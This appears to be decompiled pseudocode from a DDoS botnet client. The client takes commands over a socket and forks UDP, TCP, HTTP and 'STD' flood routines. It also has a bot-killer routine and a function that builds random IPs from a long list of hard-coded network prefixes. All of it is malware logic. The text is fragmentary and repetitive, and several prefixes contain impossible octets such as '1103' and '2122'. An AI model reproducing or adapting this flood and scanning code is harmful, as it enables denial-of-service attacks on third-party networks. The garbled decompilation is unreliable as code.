                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                if (listFork() == 0) {
                                                                                                    sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendSTD(v269, v270, v271);
                                                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                                while (true) {
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                                        while (true) {
                                                                                                        sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"KILLATTK") == 0) {
                                                                                                            while (true) {
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendSTD(v269, v270, v271);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                            if (listFork() == 0) {
                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                            sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                                            sendUDP(v216, v246, v247, v248, v249, v220, v219);
                                                                        if (listFork() == 0) {
                                                                            sendUDP(v245, v246, v247, v248, v249, v220, v219);
                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                            sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                            sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                        if (listFork() == 0) {
                                                                                                            sendTCP(v257, v258, v259, v260, v261, v217, v218);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                            if (listFork() == 0) {
                                                                                                                sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                                                    if (listFork() == 0) {
                                                                                                                                        sendSTD(v269, v270, v271);
                                                                                                                                        while (true) {
                                                                                                                                            if (listFork() == 0) {
                                                                                                                    sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                while (true) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                        if (listFork() == 0) {
                                                                                                                            sendSTD(v269, v270, v271);
                                                                                                                            while (true) {
                                                                                                                                if (listFork() == 0) {
                                                                                                        sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                        if (listFork() == 0) {
                                                                                            sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendSTD(v269, v270, v271);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                                                        if (listFork() == 0) {
                                                                                                            sendSTD(v269, v270, v271);
                                                                                                            while (true) {
                                                                                                                if (listFork() == 0) {
                                                                                        sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                    if (listFork() == 0) {
                                                                                                        sendSTD(v269, v270, v271);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                    sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                    sockprintf(v206, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                    sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                    sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                if (listFork() == 0) {
                                                                    sendTCP(v257, v258, v259, v260, v261, v217, v218);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                    if (listFork() == 0) {
                                                                        sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                            if (listFork() == 0) {
                                                                                                sendSTD(v269, v270, v271);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                            sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                        while (true) {
                                                                            if (listFork() == 0) {
                                                                                    if (listFork() == 0) {
                                                                                        sendSTD(v269, v270, v271);
                                                                                        while (true) {
                                                                                            if (listFork() == 0) {
                                                                    sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                if (listFork() == 0) {
                                                                                    sendSTD(v269, v270, v271);
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                        sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                if (listFork() == 0) {
                                                    sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                        if (listFork() == 0) {
                                                                            sendSTD(v269, v270, v271);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                        sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                                                if (listFork() == 0) {
                                                                    sendSTD(v269, v270, v271);
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                            if (listFork() == 0) {
                                                                sendSTD(v269, v270, v271);
                                                                while (true) {
                                                                    if (listFork() == 0) {
                                            sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                if (listFork() == 0) {
                    v272 = __GI_inet_ntoa(&v213, 0x10030000);
                    v277 = sockprintf(v212, (int32_t)"COMMENCING BOT KILL ON -> %s", v272);
                    botkiller(v277);
            if (__GI_strcoll((char *)*a2, (int32_t)"GETPUBLICIP") == 0) {
                v273 = __GI_inet_ntoa(&v213, 0x10030000);
                sockprintf(v212, (int32_t)"My Public IP: %s", v273);
                if (__GI_strcoll((char *)*a2, (int32_t)"UDP") == 0) {
                                                            sockprintf(v206, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                                                                if (listFork() == 0) {
                                                                    sendUDP(v245, v246, v247, v248, v249, v220, v219);
                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                                    sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                    sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                                if (listFork() == 0) {
                                                                                                    sendTCP(v257, v258, v259, v260, v261, v217, v218);
                                                                                                    while (true) {
                                                                                                        if (listFork() == 0) {
                                                                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                                    if (listFork() == 0) {
                                                                                                        sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                                            if (listFork() == 0) {
                                                                                                                                sendSTD(v269, v270, v271);
                                                                                                                                while (true) {
                                                                                                                                    if (listFork() == 0) {
                                                                                                            sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                        while (true) {
                                                                                                            if (listFork() == 0) {
                                                                                                                    if (listFork() == 0) {
                                                                                                                        sendSTD(v269, v270, v271);
                                                                                                                        while (true) {
                                                                                                                            if (listFork() == 0) {
                                                                                                    sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                                                                if (listFork() == 0) {
                                                                                                                    sendSTD(v269, v270, v271);
                                                                                                                    while (true) {
                                                                                                                        if (listFork() == 0) {
                                                                                                sockprintf(v206, (int32_t)"STD <target> <port> <time>", 0x10010000);
                                                                        sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                if (listFork() == 0) {
                                                                                    sendHTTP(v212, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                    while (true) {
                                                                                        if (listFork() == 0) {
                                                                    while (true) {
                                                                        if (listFork() == 0) {
                                                        if (listFork() == 0) {
                                                            sendUDP(v245, v246, v247, v248, v249, v220, v219);
                                                            if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                                                            sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                            sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                                        if (listFork() == 0) {
                                                                                            sendTCP(v257, v258, v259, v260, v261, v217, v218);
                                                                                            while (true) {
                                                                                                if (listFork() == 0) {
                                                                                    if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                                            if (listFork() == 0) {
                                                                                                sendHTTP(*v236, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                                                while (true) {
                                                                                                    if (listFork() == 0) {
                                                                sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                                if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                                        if (listFork() == 0) {
                                                                            sendHTTP(*v236, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                                            while (true) {
                                                                                if (listFork() == 0) {
                                                            while (true) {
                                                                if (listFork() == 0) {
                    sockprintf(v206, (int32_t)"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>", 0x10010000);
                    if (__GI_strcoll((char *)*a2, (int32_t)"TCP") == 0) {
                                                    sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                    sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                                                if (listFork() == 0) {
                                                    sendTCP(v257, v258, v259, v260, v261, v217, v218);
                                                    while (true) {
                                                        if (listFork() == 0) {
                                            if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                                    if (listFork() == 0) {
                                                        sendHTTP(*v236, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                                        while (true) {
                                                            if (listFork() == 0) {
                        sockprintf(v206, (int32_t)"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)", 0x10010000);
                        if (__GI_strcoll((char *)*a2, (int32_t)"HTTP") == 0) {
                                if (listFork() == 0) {
                                    sendHTTP(*v236, v211, (int16_t)(v265 % 0x10000), v210, v209, v268);
                                    while (true) {
                                        if (listFork() == 0) {
=================FUNCTION : GetRandomPublicIP ===================
++++++++ FUNCTION START 11524
++++++++ FUNCTION END 12986
++++++++ FUNCTION LENGTH 1462
    random();
    random();
    v210 = random() % 255;
    v211 = random() % 255;
    int32_t v212 = random() % 208; // 0x10003364
        szprintf((int32_t)&v213, (int32_t)"177.5.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.165.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"185.3.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"37.158.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"95.9.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.252.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"58.71.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.55.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"103.186.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"103.189.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"221.120.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"88.5.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.254.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.20.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.47.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.57.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"45.1103.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"101.51.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"137.59.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1.56.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1.188.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.204.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.0.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.8.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.91.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.54.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.98.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.192.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"36.32.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"36.248.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"39.64.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.4.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.48.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.52.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.56.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.63.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.84.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.176.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.224.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"42.176.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.253.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.230.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"163.53.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.230.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"62.252.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.245.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"62.255.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.25.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.54.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.255.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.204.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.24.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.191.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.100.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.188.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.189.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"94.174.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.160.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.161.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.162.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.163.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.164.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.165.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.166.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.167.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.168.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.169.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.170.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.171.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.172.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.173.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.174.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.176.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.1103.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.179.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.180.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.11103.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.182.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.183.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.184.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.1185.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.186.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.187.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.188.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.189.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.190.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.191.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"45.121.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"45.120.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"45.115.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.252.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.230.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.240.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"43.245.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.174.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"49.118.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"103.188.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"45.1177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.30.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.33.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.16.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"202.44.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"116.93.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"91.83.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.253.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.173.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.190.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"146.88.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.196.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.1103.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.45.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"183.223.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"116.71.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.44.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"110.235.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"124.253.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"211.237.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.173.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"1103.93.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"111.9.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"222.252.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.174.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"222.252.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.160.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.161.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.162.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.163.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.164.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.165.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.166.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.167.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.168.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.169.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.17.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.18.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.19.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.20.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.21.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"123.22.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"222.252.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"222.253.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"222.254.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"222.255.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"37.247.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"122.208.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"183.220.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"177.201.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.198.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"183.223.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"91.205.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"88.248.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"88.105.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"88.247.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"185.105.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"188.3.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.203.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.55.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.220.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"183.233.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.242.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.198.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.122.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.195.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.203.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.2122.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.218.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.225.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.228.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.231.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.60.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.248.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.253.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.255.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.35.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.49.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"108.62.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"144.48.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"163.47.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"163.53.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"223.29.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"59.153.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.176.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.177.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"104.183.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"202.164.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"203.134.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"210.56.%d.%d", (int32_t)v210);
        szprintf((int32_t)&v213, (int32_t)"49.156.%d.%d", (int32_t)v210);
